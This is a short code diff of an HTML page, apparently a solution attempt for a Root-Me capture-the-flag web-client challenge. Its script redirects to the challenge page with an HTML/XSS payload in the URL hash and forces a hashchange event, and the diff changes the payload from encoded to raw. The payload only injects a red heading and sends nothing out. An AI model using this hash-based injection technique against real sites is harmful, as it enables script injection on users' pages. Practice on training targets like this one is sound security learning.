@@ -2,13 +2,16 @@
 <html>
   <body>
     <script>
+      // RAW payload (not URI-encoded)
       const payload = '<h1 style="color:red">XSS</h1>';
-      // Redirect to vulnerable page with payload in hash
-      location.href = 'http://challenge01.root-me.org/web-client/ch62/#' + encodeURIComponent(payload);
-      
-      // Trigger the hashchange event manually after delay
+
+      // Go to target with raw payload (browser will encode it properly in URL)
+      location.href = 'http://challenge01.root-me.org/web-client/ch62/#' + payload;
+
+      // Trigger hashchange after 1 second
       setTimeout(() => {
-        location.hash = location.hash + " ";
+        // Just change hash to force the hashchange listener
+        location.hash += ' ';
       }, 1000);
     </script>
   </body>
